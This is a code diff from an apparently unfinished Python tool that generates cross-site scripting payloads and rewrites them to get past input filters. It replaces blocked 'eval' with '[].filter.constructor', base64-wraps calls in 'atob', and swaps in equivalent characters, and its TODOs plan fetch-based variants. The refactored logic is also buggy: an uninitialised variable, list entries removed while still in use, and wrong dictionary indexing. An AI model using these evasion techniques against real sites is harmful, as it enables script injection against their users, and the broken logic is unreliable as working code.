@@ -45,8 +45,68 @@ TEST_INPUT = "ABCDEFGHb3liottHGFEDCBA"
 
 
 
-def replace_list_element(l: list, old: str, new: str) -> list: l[l.index(old)] = new; return l
+def replace_list_element(l: list, old: str, new: str) -> list: l[l.index(old)] = new
 
+
+
+def next_payload(lastTestedPayload: Payload) -> Payload:
+    raise NotImplementedError("Not implemented yet (in next_payload)")
+
+
+def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list) -> Payload:
+    """
+    Updates the payload by replacing the failed data with the next possible value
+    """
+    usedCharsReplaced = lastTestedPayload.usedCharsReplaced
+    if len(failedData) == 0:
+            # if there is no failed data, it means that the last tested payload was in the response but didn't trigger the alert
+            # so we need to try the next payload
+            return next_payload(lastTestedPayload)
+
+    # replace the failed data with the next possible value
+    toRemove = []
+    for data in failedData:
+        if data['type'] == "FUNCTION":  # TODO: improve
+            # if eval is filtered, we try to use the constructor instead
+            if data['value'] == 'eval' and not failedData.__contains__('[') and not failedData.__contains__(']'): 
+                newChar = '[].filter.constructor' 
+
+            # if the original function is not eval and [].filter.construtor, we try to use eval
+            elif data['value'] != '[].filter.constructor': newChar = 'eval'
+
+            toRemove.append(data)
+
+        elif data['type'] == "ARGS":
+            if usedCharsReplaced.__contains__('eval'):
+                args = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('ARGS')]
+                func = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('FUNCTION')]
+                toEncode = f"{func}({args})"
+                newChar =f"atob({b64.b64encode(toEncode.encode()).decode()})"
+            else:
+                # TODO: verify if args contains special characters which need to be replaced
+                pass
+
+            toRemove.append(data)
+
+        else:
+            # get the next equivalent character which is not in the failed data
+            for char in EQUIVALENTS[data]:
+                if char not in failedData:
+                    newChar = char
+                    break
+        
+        if newChar is None:
+            raise Exception("No more equivalent character available")
+        
+        # remove old failed functions and args
+        for data in toRemove: failedData.remove(data)
+        
+        payload_str = lastTestedPayload.value.replace(data['value'], newChar)
+        replace_list_element(usedCharsReplaced, data['value'], newChar)
+
+
+    return payload_str
+    
 
 
 def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
@@ -63,47 +123,19 @@ def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel
 
         # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
         payload_str = payload_str.replace("FUNCTION", "alert")
-        usedCharsReplaced = replace_list_element(payload['used_chars'].copy(), 'FUNCTION', 'alert')
+        usedCharsReplaced = payload['used_chars'].copy()
+        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
         payloadType = PayloadType.ALERT
 
         # TODO: mettre les arguments en fonction du type alert ou request bin
         payload_str = payload_str.replace("ARGS", "xss")
-        usedCharsReplaced = replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
+        replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
 
     else:
-        usedCharsReplaced = lastTestedPayload.usedCharsReplaced
-        if len(failedData) == 0:
-            # if there is no failed data, it means that the last tested payload was in the response but didn't trigger the alert
-            # so we need to try the next payload
-            raise NotImplementedError("Not implemented yet (in build_ESCAPE_JS_payload)")
-
-        # replace the failed data with the next possible value
-        for data in failedData:
-            # get the next equivalent character which is not in the failed data
-            if data['type'] == "FUNCTION":  # TODO: improve
-                newChar = 'eval(atob'
-
-            elif data['type'] == "ARGS":
-                if usedCharsReplaced.__contains__('atob'):
-                    args = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('ARGS')]
-                    newChar =f"{b64.b64encode(args.encode()).decode()})"
-                else:
-                    # TODO: verify if args contains special characters which need to be replaced
-                    pass
-            else:
-                for char in EQUIVALENTS[data]:
-                    if char not in failedData:
-                        newChar = char
-                        break
-            
-            if newChar is None:
-                raise Exception("No more equivalent character available")
-            
-            payload_str = lastTestedPayload.value.replace(data['value'], newChar)
-            usedCharsReplaced = replace_list_element(usedCharsReplaced, data['value'], newChar)
+        payload_str = update_payload_with_failed_data(lastTestedPayload, failedData)
 
 
-    payloadType = PayloadType.ALERT # TODO: remove
+    payloadType = PayloadType.ALERT # TODO: change this
     return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced)
 
 
@@ -121,20 +153,16 @@ def build_INJECT_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
 
         # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
         payload_str = payload_str.replace("FUNCTION", "alert")
-        usedCharsReplaced = replace_list_element(payload['used_chars'].copy(), 'FUNCTION', 'alert')
+        usedCharsReplaced = payload['used_chars'].copy()
+        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
         payloadType = PayloadType.ALERT
 
         # TODO: mettre les arguments en fonction du type alert ou request bin
         payload_str = payload_str.replace("ARGS", "xss")
-        usedCharsReplaced = replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
+        replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
 
     else:
-        if len(failedData) == 0:
-            # if there is no failed data, it means that the last tested payload was in the response but didn't trigger the alert
-            # so we need to try the next payload
-            raise NotImplementedError("Not implemented yet (in build_INJECT_HTML_payload)")
-
-        # TODO: same as above
+        payload_str = update_payload_with_failed_data(lastTestedPayload, failedData)
 
 
     payloadType = PayloadType.ALERT # TODO: remove
